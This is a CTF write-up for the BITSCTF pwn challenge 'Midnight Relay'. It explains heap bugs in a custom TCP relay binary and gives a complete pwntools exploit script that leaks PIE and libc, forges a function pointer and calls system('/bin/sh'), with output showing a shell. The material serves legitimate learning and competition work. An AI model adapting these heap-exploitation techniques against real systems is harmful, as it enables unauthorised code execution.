---
title: "Midnight Relay - BITSCTF Pwn Writeup"
description: "---"
event: "BITS CTF"
year: 2025
category: pwn
tags: ["pwn","rop","heap","crypto","ghidra","pwntools","docker"]
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "BITSctf/PWN/Midnight Relay"
featured: false
flagsHidden: false
---

> Imported from [BITSctf/PWN/Midnight Relay](https://github.com/R3izorr/CTF_writeup/tree/main/BITSctf/PWN/Midnight%20Relay).

# Midnight Relay - BITSCTF Pwn Writeup

## 1. Challenge Description
**Challenge:** Midnight Relay  
**Category:** Pwn / Heap Exploitation  
**Description:** A fallback relay with a custom TCP protocol. We are provided with the binary, a Dockerfile, and a protocol specification.  
**Objective:** Exploit the heap management to bypass protections (PIE, NX, CET) and pop a shell.

---

## 2. Initial Triage & Protections

We start by inspecting the binary and its protections.

```bash
$ file midnight_relay
midnight_relay: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, not stripped

$ checksec --file=./midnight_relay
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

**Key Takeaways:**
* **Full Protections:** ASLR, DEP (NX), and PIE are all active.
* **Intel CET (SHSTK/IBT):** Shadow Stack and Indirect Branch Tracking are enabled. This makes standard ROP chains and simple function pointer overwrites impossible unless we jump to a valid `endbr64` instruction (like the start of `system()`).
* **Environment:** The Dockerfile uses `ubuntu:24.04`, implying `glibc 2.39` (which includes Safe-Linking and Tcache mitigations).

To ensure our offsets match the remote server, we extract the libraries from the Docker container and patch the binary using `pwninit`:

```bash
# Extract libs
docker run --rm -v "$(pwd):/out" ubuntu:24.04 sh -c "cp -L /lib/x86_64-linux-gnu/libc.so.6 /out/ && cp -L /lib64/ld-linux-x86-64.so.2 /out/"

# Patch binary
pwninit --bin midnight_relay --libc libc.so.6 --ld ld-linux-x86-64.so.2
```

---

## 3. Code Analysis & Reversing

We decompiled the binary using Ghidra. The binary reads raw TCP streams and processes them according to a custom protocol. Every packet requires a 1-byte checksum (`key`). This checksum is tied to a **rolling epoch state**.

### The Custom Protocol Math
* **The Seed:** The epoch is initialized from the `.data` section with the seed `0x6b1d5a93`.
* **The Checksum Calculation:** For every byte in the payload, the epoch updates via: `epoch = ((epoch * 8) ^ (epoch >> 2) ^ byte ^ 0x71) & 0xFFFFFFFF`. The lowest byte of this result becomes the valid `key`.
* **The State Update:** After a packet is successfully processed, the global epoch updates using the operation code: `epoch ^= (op << 9) | 0x5f`.

Exploitation requires tracking this state perfectly in the exploit script to prevent the binary from silently dropping packets.

### Decompiled Logic & Vulnerabilities

The binary manages data "slots" on the heap. When creating a chunk (`0x11` forge), it allocates `size + 0x20` bytes. The requested data goes into `size`, and the trailing `0x20` bytes store critical, XOR-mangled metadata:
1. A random `cookie` (from `/dev/urandom`).
2. The mangled execution pointer (defaults to `idle`).
3. The raw Heap Pointer.
4. A random Sync Token.

```c
// 0x33: Observe (Read) - VULNERABILITY: OOB Read
// Check: if (offset + n <= size + 0x20)
// Allows reading the 0x20 metadata bytes!

// 0x22: Tune (Write) - VULNERABILITY: OOB Write
// Check: if (offset + n <= size + 0x20)
// Allows overwriting the 0x20 metadata bytes!

// 0x44: Shred (Free) - VULNERABILITY: UAF
// free(ptr);
// slots[i].sync = 0; 
// BUT slots[i].ptr is NOT NULL! Pointer remains valid.

// 0x66: Fire (Execute)
// Decrypts metadata[1] and calls it natively: call target();
```

---

## 4. Dynamic Analysis (GDB)

To confirm vulnerabilities and logic without writing a full checksum script immediately, we patched the validation check dynamically in GDB to let us send "dumb" packets.

```gdb
# Auto-patch the register to pass the checksum check
pwndbg> b *main+360
pwndbg> commands 1
> silent
> set $dil = $dl
> pi gdb.execute("continue")
> end
```

By forging a chunk and inspecting the heap, we dumped the 4 QWORDs of the metadata. Because the binary leaks the **Raw Heap Pointer** in the 3rd QWORD, we proved we could reverse the XOR math to recover the Cookie and the PIE base.

---

## 5. Exploitation Strategy

### Step 1: Info Leak (OOB Read)
**Goal:** Defeat PIE and recover the XOR cookie.
1. **Forge** a chunk of size `0x80`.
2. **Observe** `0x20` bytes starting at offset `0x80`. Due to the OOB bug, this reads the hidden metadata.
3. **Solve:** Use the leaked heap pointer to reverse the XOR operations and calculate `pie_base`.

### Step 2: Libc Leak (Unsorted Bin UAF)
**Goal:** Defeat ASLR by leaking a `libc` pointer.
* **The Problem:** `glibc` puts small freed chunks (<= 0x410) into the **tcache**, which only links to other heap chunks (no libc pointers).
* **The Solution:** We allocate a chunk **larger than 0x410** (e.g., `0x420`). When freed, this bypasses tcache and goes to the **Unsorted Bin**. Unsorted Bin chunks contain `fd` and `bk` pointers pointing to `main_arena` (inside libc).

**The "Calloc Carve" Trick:**
1. Forge Chunk 1 (`0x420`).
2. Forge Chunk 2 (Guard chunk).
3. **Shred (Free)** Chunk 1 -> Unsorted Bin.
4. Send `observe` packet. The binary calls `calloc(1, 5)` to store our packet payload.
5. `calloc` splits the `0x20` bytes it needs from the **top** of our freed Chunk 1.
6. The `fd` (libc) pointer is pushed down by `0x20` bytes.
7. We **Observe** at offset `0x20` to read the shifted `main_arena` pointer and calculate `libc_base`.

### Step 3: Weaponization (OOB Write)
**Goal:** Execute `system("/bin/sh")`.
1. **Tune** Chunk 0 to write `/bin/sh\x00` at the start (becomes `$RDI`).
2. Encrypt the `system()` address using the same XOR math the binary uses.
3. **Tune** (OOB Write) to overwrite the metadata of Chunk 0 with the forged execution pointer.
4. **Sync** to authorize the chunk using the dynamically calculated token.
5. **Fire** to execute `system`.

---

## 6. Final Exploit Script (`solve.py`)

```python
#!/usr/bin/env python3
from pwn import *
import struct

# Context & Binary Setup
elf = ELF('./midnight_relay_patched', checksec=False)
context.arch = 'amd64'

# Change to remote('IP', PORT) for actual CTF
p = process('./midnight_relay_patched')

# ---------------------------------------------------
# 1. PROTOCOL IMPLEMENTATION
# ---------------------------------------------------
# Initial Epoch Seed found in .data section
current_epoch = 0x6b1d5a93

def send_packet(op, payload=b""):
    global current_epoch
    
    # Calculate Rolling Checksum
    temp_epoch = current_epoch
    for b in payload:
        temp_epoch = ((temp_epoch * 8) ^ (temp_epoch >> 2) ^ b ^ 0x71) & 0xFFFFFFFF
    key = temp_epoch & 0xFF
    
    # Construct Header
    header = struct.pack('<B B H', op, key, len(payload))
    p.send(header + payload)
    
    # Update State
    current_epoch ^= (op << 9) | 0x5f

def forge(idx, size, tag):
    payload = struct.pack('<B H B', idx, size, len(tag)) + tag
    send_packet(0x11, payload)

def tune(idx, offset, n, blob):
    payload = struct.pack('<B H H', idx, offset, n) + blob
    send_packet(0x22, payload)

def observe(idx, offset, n):
    payload = struct.pack('<B H H', idx, offset, n)
    send_packet(0x33, payload)

def shred(idx):
    payload = struct.pack('<B', idx)
    send_packet(0x44, payload)

def sync(idx, token):
    payload = struct.pack('<B I', idx, token)
    send_packet(0x55, payload)

def fire(idx):
    payload = struct.pack('<B', idx)
    send_packet(0x66, payload)

# ---------------------------------------------------
# 2. EXPLOIT EXECUTION
# ---------------------------------------------------

p.recvuntil(b"midnight-relay\n")
log.info("--- Step 1: Leaking PIE & Cookie (OOB Read) ---")

# Forge 0x80 chunk, read 0x20 bytes past the end
forge(0, 0x80, b"AAAA")
observe(0, 0x80, 0x20)
leak = p.recv(0x20)

# Unpack Metadata
val0, val1, val2, val3 = struct.unpack('<Q Q Q Q', leak)
heap_ptr = val2

# Reverse XOR Crypto
cookie = val0 ^ (heap_ptr >> 12) ^ 0x48454c494f5300ff
idle_ptr = val1 ^ (heap_ptr >> 13) ^ val0 ^ val3
pie_base = idle_ptr - 0x17b0

log.success(f"Cookie:   {hex(cookie)}")
log.success(f"PIE Base: {hex(pie_base)}")

log.info("--- Step 2: Leaking Libc (Unsorted Bin UAF) ---")

# 0x420 is large enough to bypass Tcache -> Unsorted Bin
forge(1, 0x420, b"AAAA") 
forge(2, 0x420, b"BBBB") # Prevent consolidation
shred(1)                 # Free Chunk 1

# Read shifted fd pointer (calloc carves 0x20 bytes off front)
observe(1, 0x20, 8)
libc_leak = u64(p.recv(8).ljust(8, b'\x00'))
libc_base = libc_leak - 0x203b20 # Static offset for main_arena+96

libc = ELF('./libc.so.6', checksec=False)
libc.address = libc_base
system_addr = libc.sym['system']

log.success(f"Libc Base: {hex(libc_base)}")
log.success(f"System:    {hex(system_addr)}")

log.info("--- Step 3: Weaponization (OOB Write) ---")

# Write "/bin/sh" to start of Chunk 0 (Arg1 for system)
tune(0, 0, 8, b"/bin/sh\x00")

# Encrypt the system() pointer
new_val1 = (heap_ptr >> 13) ^ system_addr ^ val0 ^ val3

# Overwrite metadata with OOB Write
forged_metadata = struct.pack('<Q Q Q Q', val0, new_val1, val2, val3)
tune(0, 0x80, 0x20, forged_metadata)

# Authorize and Fire
sync_token = current_epoch ^ (val0 & 0xFFFFFFFF) ^ (val3 & 0xFFFFFFFF)
sync(0, sync_token)

log.success("Popping Shell...")
fire(0)

p.interactive()
```
## 7. Flag and result
```bash
python3 solve.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/kuri/.cache/.pwntools-cache-3.12/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.15.0)
[+] Starting local process './midnight_relay_patched': pid 1043
[*] --- Step 1: Leaking PIE & Cookie (OOB Read) ---
[+] Cookie:   0xe541cd4ee59f461f
[+] PIE Base: 0x62dba9703000
[*] --- Step 2: Leaking Libc (Unsorted Bin UAF) ---
[+] Libc Base: 0x7ecfa2400000
[+] System:    0x7ecfa2458750
[*] --- Step 3: Weaponization (OOB Write) ---
[+] Popping Shell...
[*] Switching to interactive mode
$ ls
Dockerfile                           flag.txt:Zone.Identifier
Dockerfile:Zone.Identifier           ld-linux-x86-64.so.2
description.md                       libc.so.6
description.md:Zone.Identifier       midnight_relay
docker-compose.yaml                  midnight_relay:Zone.Identifier
docker-compose.yaml:Zone.Identifier  midnight_relay_patched
dumb_forge.bin                       payload.bin
dumb_leak.bin                        run
dumb_uaf.bin                         run:Zone.Identifier
flag.txt                             solve.py
$
```
